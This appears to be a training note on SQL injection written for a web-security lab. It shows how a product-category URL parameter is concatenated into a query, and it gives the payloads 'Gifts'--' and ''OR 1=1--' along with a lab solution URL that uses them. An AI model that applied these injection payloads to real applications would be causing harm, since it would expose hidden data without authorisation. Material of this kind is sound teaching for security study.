- Consider a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:
```js
https://insecure-website.com/products?category=Gifts
```
- This causes the application to make a SQL query to retrieve details of the relevant products from the database:
```sql
'SELECT * FROM products WHERE category = 'Gifts' AND released = 1'
```
- This SQL query asks the database to return:
	-  all details (*)
	-   from the products table
	-   where the category is Gifts
	-   and released is 1
- The restriction `released = 1` is being used to hide products that are not released. For unreleased products, presumably `released = 0`.

## If the developer doesn't implement any defenses against SQL 

- The application developer doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:
```js
`https://insecure-website.com/products?category=Gifts'--`
```

- Above results in SQL query:
  ```sql
  `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
```
- The key thing here is that the double-dash sequence `--` is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment. This effectively removes the remainder of the query, so it no longer includes `AND released = 1`
- In simple words, This means that all products are displayed, including unreleased products.
- Going further, an attacker can cause the application to display all the products in any category, including categories that they don't know about:
```js 
`https://insecure-website.com/products?category=Gifts'+OR+1=1--`
```

- This results in the SQL query:
```sql 
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
```
- Since `1=1` is always true, the query will return all items.

## LAB solution
- In search bar, use
```js
https://0abc005a043455c5803d71dd00670030.web-security-academy.net/filter?category=Gifts%27+or+1=1--
```